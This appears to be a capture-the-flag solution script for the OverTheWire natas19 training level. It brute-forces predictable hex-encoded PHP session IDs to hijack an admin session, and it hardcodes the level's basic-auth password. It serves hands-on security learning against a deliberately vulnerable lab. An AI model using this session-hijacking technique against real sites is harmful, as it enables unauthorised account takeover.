import requests
from requests.auth import HTTPBasicAuth

def bin2hex(s):
    return ''.join(f'{ord(x):x}' for x in s)

#print(bin2hex(str(281)+"-admin"))


for idnum in range (1,640):
    print("testing "+str(idnum))
    user = "admin"
    idstr = str(idnum)+"-admin"
    encoded = bin2hex(idstr)
    #print(encoded)
    cookie = {"PHPSESSID": str(encoded)}


    r = requests.post(url = 'http://natas19.natas.labs.overthewire.org/index.php?debug', auth = HTTPBasicAuth("natas19", "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"), data = {"username":'admin', "password" : 'randi'}, cookies = cookie)

    #print(r.text)

    if "You are an admin" in r.text:
        print("HACKED:"+str(idnum))
        break
